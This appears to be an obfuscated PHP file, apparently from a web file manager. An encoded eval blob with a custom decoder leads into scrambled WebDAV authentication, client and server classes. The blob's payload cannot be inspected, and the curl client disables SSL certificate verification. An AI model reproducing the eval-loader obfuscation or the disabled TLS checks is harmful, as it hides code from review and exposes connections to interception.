ev('Kø^∞Ä'."\0".'(Å•§∫±íÌŸ⁄/øP‡~tIpD»ïoÖﬁå j~‡*ïÓÿû7ΩáÁ"J;?±C').base64_decode('gvMaJIN57pKgIbFLGujDv1wnG/QdJgtkUYO6EsQhRVOi8ZIoSYIzFqrHkF7HADqi+dZBVWtqhCrZ')."\330\146\10\356\323\11\61\0\356\130\64\264\126\354\170\310\164\347\325\44\130\325\301\212\352\6\44\321\12\165\360\354\145\320\213\314\377\377\22\140\55\250\136\370\377\177\51\120\145\302\147\201\105\46\121\264\24".strrev('ÅÅQàêWP+U2NlÙ˙%…HœV4´!Ò‡Ñ…⁄.B^ H—ZΩ}cR'."\r".''."\n".'¨ç®≠XU÷82É*øÛ').strrev('IÇc("`c0W—Z•ïòò¬Œ—¶%ÌÆµíwêõÇû“®m59E,4ö‹mDæ›5◊ôÜ')."\236\53\232\240\60\216\215\323\30\172\12\256\103\155\252\6\137\252\265\20\157\303\20\206\240\217\153\12\235\364\60\77\64\252\363\42\240\227\63\146\230\17\43\262\174\304\165\146\133\20\27\255\100\24\12\263\267"."\12\232\120\265\321\131\241\27\344\261\242\302\340\255\216\131\302\332\214\62\61\62\160\364\30\305\262\165\55\43\27\134\44\174\31\316\35\105\337\340\14\110\303\53\104\253\4\75\36\273\1\77\51\225\261\344\62"."\132\200\3\72\55\117\234\166\21\377\306\225\25\153\341\322\205\25\21\33\16\256\162\7\46\12\240\216\112\12\254\324\140\303\76\151\263\332\365\256\305\6\30\370\332\256\256\326\115\3\314\343\20\271\345\41\306"."\xfd\x25\xb4\x4c\x11\x26\xd\xa5\x51\x12\x2e\x81\xf9\x0\x7d\xa6\xa6\x1a\x9c\x80\x46\x8a\xad\xa7\xd3\xf0\x38\x82\xc4\x8\x16\xda\x4f\xd2\x2c\x78\xb3\x48\x63\x85\x9c\xac\x29\x26\x8d\x81\xac\xa2\x60\xbb\x52\xcc\xb8\xd2\x9e\x91\xa1"."\322\144\341\154\135\254\172\34\133\46\22\310\104\274\240\344\360\141\11\262\31\243\360\311\151\340\311\234\1\135\233\245\304\270\232\207\127\214\62\253\244\1\104\166\300\215\106\51\116\306\120\24\315\6\111\344\212".base64_decode('ig0g5wpZGUEwgLwz0Znwdma8nYa3k2y1v4N/vkuSyapFnDbR1ylQA/FOGrqTyajpinB4NVcxoUCl')."\272\161\256\261\223\25\164\151\4\164\170\131\215\356\44\204\224\260\156\261\265\225\33\362\240\244\164\216\252\171\5\173\227\306\273\172\202\375\161\44\342\207\372\242\276\36\107\2\340\231\321\140\147\31\270\43\104".base64_decode('Hco6ap3I29XQVA0t8/3cMQ6IyiZzqEr8FJI8UKcfBxcuShheapOYEDY8Zl7OMYUmL9Uz95pFIiIQ')."\xdf\x29\x3d\x41\x32\x77\xbc\x64\x7f\xd7\xa3\x26\xa8\x1\x4f\x67\xcf\x1a\xd0\x4\xe8\xe2\x22\x14\xf6\x85\x57\x73\x87\xbf\x20\x25\xea\xb\x4f\x93\x2\xf3\x10\xf\x75\xd4\x69\xda\xc2\x25\x4b\x96\xd0\xf7\x46\x93\x39\x6c\xc4\x8\x75"."\xfb\xd9\x7d\x39\x80\xc2\xd3\x27\xa5\x1c\x2a\x97\x63\x42\xb5\x3c\x64\xc7\x63\xbb\x6f\xf\xcb\x86\xf\xb7\xa0\x42\xe2\x1a\xb5\x30\x4d\xa2\x4a\x5f\x78\x90\xb\x54\xbd\xbc\x50\xa4\x97\xd9\xec\x38\x4d\x70\x68\x33\x8f\xfc\x4e\x90\xdf"."\xc4\x14\x7d\x82\xc0\x20\xba\x3\x49\x99\xe4\x57\x4d\x72\x3e\x96\x99\x82\xaa\x6f\x34\xc\x56\x9a\x1c\x3f\xc7\x44\xca\xc0\xc3\x52\xa7\xac\x55\x5b\x52\x8\xa0\x2d\x94\x7a\xa1\x21\x91\x96\x91\xa6\x40\xcb\xb1\x13\x67\x93\xbb\xe1\x30"."\263\112\56\27\207\52\157\244\272\311\254\56\71\67\220\64\72\375\67\170\61\4\134\244\372\32\220\171\202\12\222\111\105\146\262\160\333\317\235\116\20\3\73\217\207\50\361\100\137\5\200\231\330\221\220\133\114".base64_decode('6oQAHRvEAZ8TvCdCSUmCSwsyX7A5elmup8iwtWLvLillYqGEXBcRV9yVvQWhz0jgM9BUS8KmsDYF')."\101\214\120\6\151\265\351\31\342\204\362\12\317\256\157\250\27\114\61\202\235\201\110\174\131\4\72\342\354\11\122\307\61\366\204\40\110\213\206\247\111\361\205\247\113\11\165\54\233\46\245\223\356\37\354\51\75"."\241\120\104\364\121\344\250\336\100\277\340\175\220\354\217\341\332\115\37\365\350\33\350\41\374\53\106\50\70\106\170\161\47\121\157\212\25\147\327\67\123\53\35\376\176\46\354\233\270\360\312\65\76\62\303\141\35".base64_decode('7dBwWErK2JoloWCpQElBz6OwdpIJZGXKyWdCt8Jeb41nTu2smXkRFquDwFidd+YAqcZMDgMIsxjc').strrev('WYñ">C=,ÒÄbé'."\0".'∂M†ñxl]O!±á\'qGÕı·ßÂ+,‘b∑‘ÀP÷&Æß≠uCj¶∂ª')."\63\124\125\75\354\251\33\132\33\213\15\303\140\55\200\265\102\170\54\342\251\253\165\265\317\362\16\250\246\210\217\135\65\117\213\103\272\234\32\201\25\330\341\76\24\131\124\260\113\102\46\20\242\76\155\177\0"."\60\145\301\21\234\225\57\10\144\13\175\225\265\64\213\32\345\30\102\227\224\42\135\373\120\220\132\135\25\270\146\275\135\231\226\105\155\263\245\136\352\0\242\232\315\356\330\346\255\116\250\235\61\107\50\50\56"."\xfa\x68\x44\x10\xf1\x91\xf\x18\x17\x9e\x6b\x15\xea\xa\xe4\x35\xc1\xad\xa\x2c\x88\xba\x1d\x22\x82\x80\x6c\x66\xa7\xf1\xc3\x83\x5d\x5f\x80\x6\x8\x75\x42\xac\xc5\x3\x37\xfc\xc2\x42\xdb\xed\xf0\x27\x45\xb6\x51\xe5\x7d\x88\xc3"."\x80\x90\xc9\xd4\x42\x78\xe0\x53\x68\x5f\x43\x3d\x82\x70\x45\xf1\xf1\x4\xe9\x1\xd8\xc7\x71\xc7\x7\x99\xf9\x72\x4e\xd8\x8e\x72\x1d\x18\x24\x4d\x70\x2d\x2c\x1a\xa5\x22\x52\x52\x2e\xc0\xfb\x9a\x14\x3e\x19\x7\x1d\x4f\xbe\xcd\x42"."\x3\xfd\xd0\x8b\x1b\xe4\x4\x71\x7a\x86\x2a\x80\x82\x7d\xc1\x78\x24\xb8\x26\x50\x96\x0\x9d\xe\x57\x4e\x1\xeb\x7d\x34\x48\xc5\x1f\x1\xde\x17\x42\x8e\xd3\x6c\xf0\x81\xbe\xe5\x7d\xa1\xc1\x4a\xa8\xd1\xde\x7e\x2e\x4b\x8\x49\x9d".base64_decode('vr5oXNiT4s0K2HKx3QrVYk8ayabGBJtmzKEYleXJTKFrPndGMOFmSv10v+PnPkRINnTwSqqAPKqQ')._kodDe('KdcBgx7hjR+H1pMCpRaKW2AmT7wR/oiIStCeMclr8o6TNqZAbArJJwKYLnaHbG1VUnUMw7n1wDue/w==').base64_decode('GiUJZ3aaFVYyYrRHZzp7aDWvUAR8SEewLYGbFF/SKooP9gjvs4PYUu7/U7CvczdIrEVxXDKOzBES')."\260\246\170\5\33\75\207\127\1\144\364\212\47\57\364\342\253\105\212\11\346\61\306\141\124\107\175\223\112\242\71\33\365\76\12\13\100\157\314\300\26\230\142\32\50\26\76\317\314\133\46\146\101\337\54\313\202"."\323\240\325\31\147\145\142\212\11\25\262\6\250\330\125\51\245\302\247\120\222\320\243\111\272\217\43\113\21\351\304\325\274\257\54\332\337\215\156\372\322\230\56\372\224\303\66\153\244\163\335\215\222\100\136\220\367"."\x8\x14\x81\x4f\x23\x58\x37\x72\x2b\xcc\x1c\xc7\xd1\xa1\x37\x4\xc1\x34\x89\x5b\xf9\xe1\xd7\x71\xd8\xd0\xa2\x67\x74\x58\xcc\x10\x2c\xc0\x94\x14\x1d\x3a\xf4\xc\x4d\xc5\xb5\x4\x3\xd1\x3b\x35\x15\x6d\xa4\x70\x67\xc1\x64\xbf\xcd".strrev('y«ΩÀùQ¡9Jó‘ëÍç¯oœp\'xûAœ∞ ˆªô◊Öî´∏WÁŸˆˆ2≠¢˙:{yL•G').strrev('ÓÕ0ö,`í∏÷Åõñ—Ïm4ö2¶ÑXP| ˜f¥56€ÃìΩ˚∂l®î-M_P¡#@lÀ‚U/ò')."\x7e\x2f\x3\x75\xd0\x6e\x62\x8f\xab\x10\x6b\x66\xe8\xda\x5e\x2c\x34\x44\xe4\xd3\x71\x6c\x2\x45\xf8\x66\x2b\x73\xf\x49\xb7\x3f\xe3\x79\x35\x29\xf5\x84\x96\xc2\xbd\xb7\x3f\x18\x59\x2e\x65\x14\x4b\xe2\x42\xf\xba\xa4\xb0\xcf\x72"."\344\170\1\35\352\121\42\117\120\25\26\24\164\243\3\20\267\315\21\17\333\221\210\176\43\141\101\145\5\343\121\27\213\203\247\47\356\24\263\156\165\340\122\41\241\54\207\370\175\41\17\334\321\330\371\2\2"."\x93\xbd\x8e\xbd\x9c\x49\x5\xde\x3\x54\xfe\x76\xb1\xc2\x77\x9\x7e\x8e\x9f\x9d\x8\x19\x54\xad\xa4\x9a\x2a\x9f\xf2\xb4\xab\x26\x45\xfc\xb2\xbe\x44\x4d\x11\x10\xa0\x5b\x2e\x6e\xf2\xcd\xba\x95\x7d\xa7\xcc\x14\x99\xc7\x31\xe\x79"."\xab\x4b\x30\x7a\xc5\x43\x22\x3e\x51\x27\xac\x6\xd0\xe1\x0\x58\x6a\xb9\xae\x5b\x81\x3a\x66\x21\xd7\xeb\x94\x36\x48\x54\xb8\xa9\xb6\xbd\x65\x47\x92\xc1\x4e\x50\x56\x29\xa9\xe3\xb0\x90\x23\x1c\x5c\xda\x1d\x9d\xae\xb8\x32\x6c\x35"."\305\37\252\163\124\106\115\121\151\221\71\242\6\62\42\52\17\153\355\330\352\4\25\23\70\357\10\372\135\350\211\61\356\5\25\5\201\74\351\202\307\133\250\2\56\341\155\46\164\111\114\246\225\252\43\313\123"."\x62\xbe\x89\x61\xc1\x50\x1c\x3f\xb0\x84\xa3\x5e\xa7\x88\x9c\x46\xb6\xa1\xc8\xba\x48\x70\xfb\xe3\xa5\x47\x8e\xcc\x85\x35\x3c\x79\xe\x50\x27\x34\x1e\x8b\x86\x20\x98\x1b\x9b\xc2\x8c\xf4\xbd\x2d\x5a\x59\x1c\x75\x3a\x75\xcd\xda\x64"."\344\162\134\220\46\161\233\170\206\40\55\226\352\221\153\5\254\117\203\356\167\26\121\167\365\260\361\330\116\31\275\71\26\310\27\54\233\15\163\267\152\362\147\47\220\230\300\267\103\120\366\322\363\223\145\0\233"."\221\174\17\255\6\363\73\12\315\110\264\264\56\266\14\261\254\0\140\15\56\24\302\266\321\56\170\122\155\365\43\42\350\121\112\212\75\373\264\145\231\116\136\317\370\264\215\61\242\210\100\107\310\50\125\160\333"."\x4e\x7f\xa1\xfb\x19\x26\x5f\xc2\xaa\x8\x82\x8\xb1\x5a\x8a\x91\x5f\xca\x3\x9d\x45\x83\xb1\xe9\x24\x5a\x21\x94\x0\x61\xb4\x2c\xb1\x57\xe1\x6a\x68\xa4\xae\x2e\xce\xd6\xf1\x6d\x34\x0\x61\xff\x45\x20\xc0\x29\x9a\xa6\x9\xc3\x8f".base64_decode('1dHD2JuhB3usoHJHRmWuTG1ohNzBFmFa3ypkfcN+VopaEDuvt0ENQbwWPeBijzLcyThBB1/rxy5k')."\xc8\x84\x14\x8b\xa4\x9e\x7a\xd0\xf\x14\xc0\x1\xbd\x32\xdb\x66\x6f\xb9\x67\x1f\xe8\x6d\x91\x89\xf\xdc\x6b\xe9\xa8\x8e\xa4\x58\x8f\x28\xff\x12\x4\x69\x91\x44\xe7\x8b\x69\xd9\xe8\x8\x8a\x1c\x40\x1a\x71\xa1\x0\x22\x4e\x51\x48"."\252\14\265\21\47\102\141\3\206\236\102\144\143\7\173\224\374\370\225\64\23\37\141\234\357\63\304\347\71\150\23\60\141\224\175\3\375\302\115\264\13\267\321\305\310\105\65\173\220\172\241\31\301\2\226\213\373".base64_decode('iXfhs3lkxMKZA+8OSvYZhX8Q1jAqftwmyTmFONZLjgxhZ09G9XKHCNyVkVbMc59RIGIXYLFoT11J').strrev('Ç]T—ïEjN√ÿàÅ"‹|Nîˆ> ∏cî“f'."\r".'	n(U+e’.~:—Ù]cTÖŒFãsC|')."\335\43\77\62\306\217\155\26\234\214\162\165\76\325\330\64\167\201\270\137\344\303\310\35\327\320\247\226\361\17\75\32\143\204\41\331\351\114\242\57\174\212\63\33\45\332\135\365\222\147\127\5\56\350\340\137\377"."\321\164\360\125\22\67\161\46\341\4\213\225\54\164\101\245\257\374\377\327\303\356\301\214\354\3\375\114\306\24\4\103\121\204\5\75\356\143\163\310\312\206\264\334\244\263\131\370\231\312\377\274\142\124\222\223\355".base64_decode('zq1QKl8UIYvA66YAEIK0VrI4LYUDDMUKQZN5MrrCvgGk2NCEtRDE2ArPX5aCFaNfm0bQp/OTVxf5')."\277\347\316\70\20\51\332\310\122\170\40\126\164\47\217\12\212\12\336\375\312\213\106\73\115\122\111\102\227\350\112\36\271\226\363\55\145\57\4\300\353\112\136\5\30\343\314\310\322\171\212\45\370\256\207\354\53"."\104\317\346\300\126\325\46\270\202\70\267\155\22\146\127\312\1\24\45\15\141\266\202\131\244\12\302\47\221\312\270\230\203\32\52\270\13\42\233\141\336\123\76\62\55\123\56\361\131\134\20\145\124\107\326\15\62"."\xbf\x91\x53\x60\xfc\x59\x61\x95\xe0\xb\x2\xf\xf5\x51\xf5\x7f\x18\x11\x8e\x7d\x90\xb0\xc8\x12\xb3\xa2\x1c\x9\x1f\x43\xb2\x8b\x4e\xac\x16\x88\x97\x55\x9a\x0\xb8\x12\x90\xfa\xc8\x52\x85\x82\x94\x7f\x42\xfd\x60\x64\x96\xb\xf3"."\220\336\263\363\3\324\240\157\130\357\140\161\314\51\265\260\170\212\374\171\117\61\225\220\221\313\26\43\21\56\265\41\325\152\341\232\10\305\231\143\121\372\214\25\175\335\112\146\216\140\240\207\33\266\125\302\307"."\110\4\45\227\343\153\201\370\154\111\56\41\33\36\100\116\243\26\365\12\126\51\42\276\6\120\101\302\247\122\6\157\200\246\46\107\53\170\1\202\235\15\325\156\4\66\54\54\136\145\150\234\153\200\65\216\251"."\xcb\xd1\x10\x12\x87\xa1\xd8\x43\x9e\xfe\xb6\xbd\x15\x11\x62\xd7\xc8\xb5\xc4\x83\xdc\xf0\x12\x3a\xfb\xe1\x94\xa3\xe7\x53\xe2\xc4\xb7\x81\xca\xd8\x45\xd4\xb6\x1e\xd8\x80\x62\xf7\x10\x22\x80\xce\xe0\x29\x3d\xd8\x72\x40\x7f\x43\x1d"."\x82\x5c\x8d\x91\x4c\xb1\x6f\x6d\xcf\x5d\x94\x3b\x85\x2a\xcf\xcd\x26\xa0\x98\x85\x2f\x17\x38\xe\x5f\xd\xb6\x6f\x58\xc5\xa2\xf1\xd5\x2f\xdc\x94\x85\xe1\xfe\xc9\xe3\x28\x9e\xcd\x98\x8a\xb3\x44\x35\xf1\x31\x9f\xb8\xb7\x0\x21\xb1"."\242\164\232\365\33\72\132\341\355\120\266\6\10\46\110\202\172\120\304\311\250\54\335\326\107\100\40\27\216\340\361\73\220\370\105\160\370\210\35\140\127\122\144\240\267\6\171\357\206\0\344\212\7\275\45\266\216".base64_decode('CBzrpL0k4T/8olwNTIaFrJOCffxN31qJv4QmPjsOz6i6dEYH9kcJoGdgO9G3VUJL6oYpoAkPKq2A')."\x6e\xd4\x71\xb0\x57\xd5\xe8\x5b\x18\x84\x96\x69\x76\xd2\xf5\x38\x56\xa9\x7c\x30\xd2\x11\xcb\x36\x26\xfc\xd9\x75\xe7\x73\xeb\x68\xb\x87\x77\x65\xb6\xcd\x19\x51\xc3\x11\x41\xc2\x31\x12\xd4\x35\xb7\xfb\x5f\x45\x89\x8\x4c\x1f\x8b"."\44\45\10\147\341\366\133\11\366\336\166\31\243\52\252\75\102\62\312\105\337\50\3\277\360\135\202\40\167\306\200\222\361\351\235\257\44\63\25\25\147\256\1\233\204\53\334\141\44\21\5\362\155\10\312\230\0"."\265\104\377\370\12\252\63\207\225\125\215\124\207\252\245\234\370\105\55\301\240\34\35\14\106\107\45\60\220\234\70\257\166\300\205\145\205\163\113\271\304\317\270\271\314\231\112\165\311\245\12\250\314\164\232\101\1"."\x84\xa1\x22\x51\x47\x78\x56\x85\x3b\xee\x55\xc6\xc5\xaf\x13\xbc\x74\xf9\xa2\x2\x11\xcb\xa1\xfc\xd9\x15\x67\xbb\xd0\xbc\x61\x70\x72\xad\xa0\x9\x5e\xd5\x8\xb9\x71\x10\xc2\x49\x32\xb7\x79\xb8\x28\x43\x47\x19\xe5\x14\xf7\xa7\x87".base64_decode('68i2h/yT9tdhGBoTwwAOUkJ326AO38HwpIwur44ksjcViq+4hbWRQo9QnHizMW2GSOWPcHq1d3HE').strrev('ü ûHœ¨£qkgbE£ä¯¬OgÕ8WÁGò´N€F·Œä≠¢b√0KÀ@m∫lÆô°`‚üq').base64_decode('dn6AdpnzXpEXIuxgyi49o3qFPLhGFbPhJJiTi262vOa4aiWzFfPiJJi3LJlmFjbcQj5LLprTNK+8').strrev('O/˘À#Ø»ÆJi#ƒ¨ﬂ∏Ìé[O"*-]?√qQkï—6çâ«àG?Àëü◊N†-˙w0itr‘–Û')."\253\160\71\212\313\204\213\163\330\246\53\130\226\54\336\264\126\276\213\15\127\234\305\246\375\222\324\1\27\73\206\152\175\154\77\361\204\235\167\236\25\354\227\150\100\4\333\270\166\121\33\325\250\73\45\360\5"."\356\246\20\232\114\372\14\147\377\121\31\320\341\261\227\222\247\126\24\274\304\126\164\371\353\202\33\343\362\235\147\216\72\333\22\35\42\343\35\213\156\251\111\101\107\3\2\105\237\276\70\235\176\44\307\217\311"."\x88\x0\x81\xaf\xde\xfc\xa2\xca\x31\xaa\xad\xa\x5f\x8c\x67\xd7\x9b\xb6\xbb\xbc\xa\xe9\x1e\x7e\x6c\x6a\xf3\x18\x8d\x5e\x1e\x63\x66\xe4\x78\x45\x27\x7\xc7\xf8\x9a\x3\xa9\xd3\x10\x48\xc7\x24\xdc\x70\xb9\xf0\x42\x89\x93\x23\xba"."\141\101\363\162\300\314\13\350\267\103\267\54\312\143\200\130\214\60\221\334\207\274\327\10\227\267\40\304\237\166\205\175\213\316\254\21\241\42\206\202\202\344\302\5\156\116\43\12\116\105\154\310\26\201\147\341\54"."\22\56\77\364\356\52\72\156\170\70\0\154\53\23\372\4\41\2\364\70\14\257\17\74\264\46\335\342\224\355\370\253\3\204\12\305\253\150\244\377\145\172\161\212\227\350\212\273\121\31\156\362\262\40\323\25\43"."\xd9\x53\x68\x62\x31\xff\x97\xdf\x54\x2\x39\xe3\xe3\x45\xe0\xe7\xab\xd1\x39\x11\x7c\xf5\x3d\xb0\x2a\x18\x89\x46\xca\x92\xfa\x7d\x91\xc8\x60\x28\xec\xc7\xfa\xa6\x65\xc9\x28\x97\x70\xef\x5f\x96\xd4\xdf\x1d\xea\x9b\x2e\x2d\xd0\xeb"."\xb\xf6\x94\xa5\x41\x3d\x0\xa8\x5\x4b\x1f\xbf\xc4\x49\xc1\x7e\x54\x4b\x5f\x4f\xf\x55\x3a\x2b\xaf\x45\xb0\x73\x39\xaf\x9\xba\xfe\xe2\x87\xb5\x85\xac\x4e\xcf\x3e\x1d\xa\x31\xf4\x6c\x3b\x22\xd3\x69\x2\x99\x3f\xdb\x1a\xb\x61"."\45\317\316\254\204\342\354\347\11\342\220\233\364\161\126\26\50\224\155\77\4\51\1\336\333\367\221\302\302\324\315\43\174\11\234\115\177\46\12\243\306\211\12\100\374\262\317\143\273\24\24\340\150\342\40\46\44"."\20\244\270\6\43\0\121\130\165\134\312\70\72\163\251\343\370\325\166\255\207\40\274\103\140\275\227\121\67\17\43\172\102\270\351\301\174\312\306\241\104\315\13\34\166\60\260\124\124\217\312\31\302\127\240\124\302"."\x63\x1d\x93\x62\x58\x3c\xf8\x68\x63\x6c\xc5\x92\x33\xf4\x6e\xdd\xc9\x8a\x85\xcb\x64\xd8\x4b\xff\xf\x69\x77\xc0\x1b\xd7\xc3\x0\x0"."".base64_decode('').""."", 10, -8))); goto AÁò≠ì¥∆; BÇΩòêä Ô: class HttpAuth { public static function get() { $b¢Éâ‘Îª∫ =& $_SERVER[¯èãÄπµ]; $a∆πà¿ﬂÉÚ = $b¢Éâ‘Îª∫[33]; $Dò∫ê¬πï– = $b¢Éâ‘Îª∫[33]; if (isset($_SERVER[$b¢Éâ‘Îª∫[1743]])) { $a∆πà¿ﬂÉÚ = $_SERVER[$b¢Éâ‘Îª∫[1743]]; $Dò∫ê¬πï– = $_SERVER[$b¢Éâ‘Îª∫[1744]]; } elseif (isset($_SERVER[$b¢Éâ‘Îª∫[1745]])) { $FÂƒ…¶√≥Ç = $_SERVER[$b¢Éâ‘Îª∫[1745]]; if (strpos(strtolower($FÂƒ…¶√≥Ç), $b¢Éâ‘Îª∫[1746]) === 0) { $Föû∞Ÿ©™‡ = explode($b¢Éâ‘Îª∫[4], base64_decode(substr($FÂƒ…¶√≥Ç, 6))); $a∆πà¿ﬂÉÚ = isset($Föû∞Ÿ©™‡[0]) ? $Föû∞Ÿ©™‡[0] : $b¢Éâ‘Îª∫[33]; $Dò∫ê¬πï– = isset($Föû∞Ÿ©™‡[1]) ? $Föû∞Ÿ©™‡[1] : 0; } } return array($b¢Éâ‘Îª∫[531] => $a∆πà¿ﬂÉÚ, $b¢Éâ‘Îª∫[901] => $Dò∫ê¬πï–); } public static function error() { goto FÎ¬É¥¥¡ê; Cî¬≈íı¢≠: die; goto D±û‡‚∆ö€; fÚàªÂƒöî: header($a†¿ÚË˜’Ó[1749]); header($a†¿ÚË˜’Ó[1750]); header($a†¿ÚË˜’Ó[1259]); goto Cî¬≈íı¢≠; FÎ¬É¥¥¡ê: $a†¿ÚË˜’Ó =& $_SERVER[¯èãÄπµ]; header($a†¿ÚË˜’Ó[1747]); header($a†¿ÚË˜’Ó[1748]); goto fÚàªÂƒöî; D±û‡‚∆ö€: } public static function make($F◊Íà„ﬂñÕ, $Eåä§÷Ûä”) { $Dµü∞Æ√ÿ∏ =& $_SERVER[¯èãÄπµ]; return $Dµü∞Æ√ÿ∏[1751] + base64_encode($F◊Íà„ﬂñÕ . $Dµü∞Æ√ÿ∏[4] . $Eåä§÷Ûä”); } } class HttpDavClient { public function __construct($EëÒ†“éﬂç, $D…å‰öêÍƒ, $AÜ‚èÉ≥ªÚ) { $this->header = array(); $this->userName = $D…å‰öêÍƒ; $this->userPassowrd = $AÜ‚èÉ≥ªÚ; } protected function makePath($fâÿú±‰Ô£) { return $fâÿú±‰Ô£; } protected function setHeader($bßØ∏¬§ê¶, $BËõÕ™ñØ÷ = false) { if ($BËõÕ™ñØ÷ === !1) { $this->header[] = $bßØ∏¬§ê¶; } else { $this->header[] = $bßØ∏¬§ê¶ . $_SERVER[¯èãÄπµ][884] . $BËõÕ™ñØ÷; } } public function move($Eœ“‡“Ú≥É, $e»ñ≤©…’¶, $aÒÁ…º≈ƒ· = '') { $C”–Æø≤øô =& $_SERVER[¯èãÄπµ]; $this->setHeader($C”–Æø≤øô[1752], $this->makePath($e»ñ≤©…’¶)); $this->setHeader($C”–Æø≤øô[1753], $C”–Æø≤øô[1754]); if ($aÒÁ…º≈ƒ·) { $this->setHeader($C”–Æø≤øô[1755], $C”–Æø≤øô[929] . $aÒÁ…º≈ƒ· . $C”–Æø≤øô[932]); } return $this->send($C”–Æø≤øô[1756], $Eœ“‡“Ú≥É); } public function copy($cå÷ÿèπÔ , $aÜøù¨¯¿ﬂ) { $b£ñ—ûÏø∏ =& $_SERVER[¯èãÄπµ]; $this->setHeader($b£ñ—ûÏø∏[1752], $this->makePath($aÜøù¨¯¿ﬂ)); $this->setHeader($b£ñ—ûÏø∏[1753], $b£ñ—ûÏø∏[1754]); return $this->send($b£ñ—ûÏø∏[1757], $cå÷ÿèπÔ ); } public function mkcol($eÈ—∏ŒÑÃÜ) { $aå´¥…öÒÆ =& $_SERVER[¯èãÄπµ]; $this->setHeader($aå´¥…öÒÆ[1753], $aå´¥…öÒÆ[1754]); return $this->send($aå´¥…öÒÆ[1758], $eÈ—∏ŒÑÃÜ); } public function delete($A¯Ê Â¢«ò, $BÖôéâ•’å = '') { $bóÜ¶êâù‚ =& $_SERVER[¯èãÄπµ]; if ($BÖôéâ•’å) { $this->setHeader($bóÜ¶êâù‚[1755], $bóÜ¶êâù‚[929] . $BÖôéâ•’å . $bóÜ¶êâù‚[932]); } return $this->send($bóÜ¶êâù‚[1247], $A¯Ê Â¢«ò); } public function propfind($bƒöñ¿˘éÂ) { $D¢©ëÜ±®î =& $_SERVER[¯èãÄπµ]; $this->setHeader($D¢©ëÜ±®î[1759], $D¢©ëÜ±®î[83]); $this->setHeader($D¢©ëÜ±®î[1760], $D¢©ëÜ±®î[1761]); $aâáòŸçœÒ = $D¢©ëÜ±®î[1762]; return $this->send($D¢©ëÜ±®î[1763], $bƒöñ¿˘éÂ, $aâáòŸçœÒ); } public function options($DÃÒüõ”Î) { return $this->send($_SERVER[¯èãÄπµ][1764], $DÃÒüõ”Î); } public function get($f∏Îãâ‘Ú›) { return $this->send($_SERVER[¯èãÄπµ][212], $f∏Îãâ‘Ú›); } public function put($bß¡ïç„ã‡, $e‚òˆ®‰ë†, $B‘•ı¶·îÑ = '') { $FïºÌ√∑âß =& $_SERVER[¯èãÄπµ]; if ($B‘•ı¶·îÑ) { $this->setHeader($FïºÌ√∑âß[1755], $FïºÌ√∑âß[929] . $B‘•ı¶·îÑ . $FïºÌ√∑âß[932]); } return $this->send($FïºÌ√∑âß[210], $bß¡ïç„ã‡, $e‚òˆ®‰ë†); } protected function send($C„ŸÑ–˜¢Ω, $dáè≈§ô±◊, $Fá„ä˜ÂÃ£ = false, $eØÔü‘ıÎ∫ = false) { goto DÖÑÖõ‰’£; dâ©¿ãÛçº: $b¢˜Úéêü‹ = curl_init($dáè≈§ô±◊); curl_setopt($b¢˜Úéêü‹, CURLOPT_CUSTOMREQUEST, $C„ŸÑ–˜¢Ω); curl_setopt($b¢˜Úéêü‹, CURLOPT_HTTPAUTH, CURLAUTH_ANY); goto fÚŸ¿∫Ûùë; Eë€Ñ∆ÿãÇ: $this->setHeader($AŒ⁄≈À¡ﬁ); if ($Fá„ä˜ÂÃ£) { $Fá„ä˜ÂÃ£ = $eå±éÇ⁄„€[1766] . $Fá„ä˜ÂÃ£; } if (!request_url_safe($dáè≈§ô±◊)) { return !1; } goto dâ©¿ãÛçº; bœ¡ø©ÂÉã: $this->header = array(); return $Aƒçœ£ûÑÜ; goto A”Áª¥ﬂàú; Eïç¶◊öâ©: curl_setopt($b¢˜Úéêü‹, CURLOPT_SSL_VERIFYPEER, !1); curl_setopt($b¢˜Úéêü‹, CURLOPT_SSL_VERIFYHOST, !1); $Aƒçœ£ûÑÜ = curl_exec($b¢˜Úéêü‹); goto bœ¡ø©ÂÉã; DÖÑÖõ‰’£: $eå±éÇ⁄„€ =& $_SERVER[¯èãÄπµ]; $AŒ⁄≈À¡ﬁ = HttpAuth::make($this->userName, $this->userPassowrd); $this->setHeader($eå±éÇ⁄„€[1765], $eå±éÇ⁄„€[50]); goto Eë€Ñ∆ÿãÇ; fÚŸ¿∫Ûùë: curl_setopt($b¢˜Úéêü‹, CURLOPT_HTTPHEADER, $this->header); curl_setopt($b¢˜Úéêü‹, CURLOPT_RETURNTRANSFER, !0); curl_setopt($b¢˜Úéêü‹, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); goto Eïç¶◊öâ©; A”Áª¥ﬂàú: } } class HttpDavServer { public function __construct($DûåüêØ∂ê, $c∑‹ËÂå—Ï) { $this->root = $DûåüêØ∂ê; $this->initPath($c∑‹ËÂå—Ï); $this->start(); } public function initPath($F‰≥∂¡ÜŒ‚) { $e÷”óÔäÑı =& $_SERVER[¯èãÄπµ]; $AÇâäøùÒÇ = rtrim($_SERVER[$e÷”óÔäÑı[1375]], $e÷”óÔäÑı[8]) . $e÷”óÔäÑı[8]; $this->urlBase = substr($AÇâäøùÒÇ, 0, strpos($AÇâäøùÒÇ, $F‰≥∂¡ÜŒ‚) + 1); $this->urlBase = rtrim($this->urlBase, $e÷”óÔäÑı[8]) . $F‰≥∂¡ÜŒ‚; $this->path = $this->parsePath($this->pathGet()); } public function checkUser() { $b“≈∫§∞∞ë =& $_SERVER[¯èãÄπµ]; $bì⁄ñ‚∏„Œ = HttpAuth::get(); if ($bì⁄ñ‚∏„Œ[$b“≈∫§∞∞ë[531]] == $b“≈∫§∞∞ë[1767] && $bì⁄ñ‚∏„Œ[$b“≈∫§∞∞ë[901]] == $b“≈∫§∞∞ë[1768]) { return !0; } HttpAuth::error(); } public function start() { goto f€ªéãÆãı; BÃ ‘á‚ õ: if (!$C´ä»ƒÓÍ∞) { return; } self::response($C´ä»ƒÓÍ∞); goto Eë…‡‚üµè; f€ªéãÆãı: $a”è‡◊Ó¥µ =& $_SERVER[¯èãÄπµ]; $this->checkUser(); $Açêç∂óîé = $a”è‡◊Ó¥µ[142] . HttpHeader::method(); goto aáçÈ·ﬂúè; aáçÈ·ﬂúè: if (!method_exists($this, $Açêç∂óîé)) { pr($Açêç∂óîé . $a”è‡◊Ó¥µ[1769]); die; } $cŸ£ÌÙà∫ú = array($a”è‡◊Ó¥µ[1770], $a”è‡◊Ó¥µ[1771]); if (!in_array($Açêç∂óîé, $cŸ£ÌÙà∫ú) && !$this->pathExists($this->path)) { $C´ä»ƒÓÍ∞ = array($a”è‡◊Ó¥µ[1034] => 404); } 